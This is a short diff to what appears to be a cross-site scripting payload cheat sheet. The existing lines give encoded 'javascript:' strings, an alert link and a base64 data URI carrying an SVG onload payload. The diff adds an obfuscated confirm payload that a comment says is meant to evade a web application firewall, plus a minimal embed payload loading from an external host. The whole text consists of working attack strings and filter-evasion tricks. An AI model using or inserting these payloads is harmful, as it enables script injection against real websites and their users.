@@ -539,3 +539,9 @@ javascript = j&#x00041vascr&#x00069pt
 ) = &rpar;
 using alert(/xss/) in a link = alert%28 /xss/%29 example: <a href=”javascript:alert%28 /xss/%29″>clickme
 base64 alert(2) = data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+
+// Got some new ones to evade the WAF
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+
+// And the shortest one
+<embed src=/\14.rs> // not testing yet
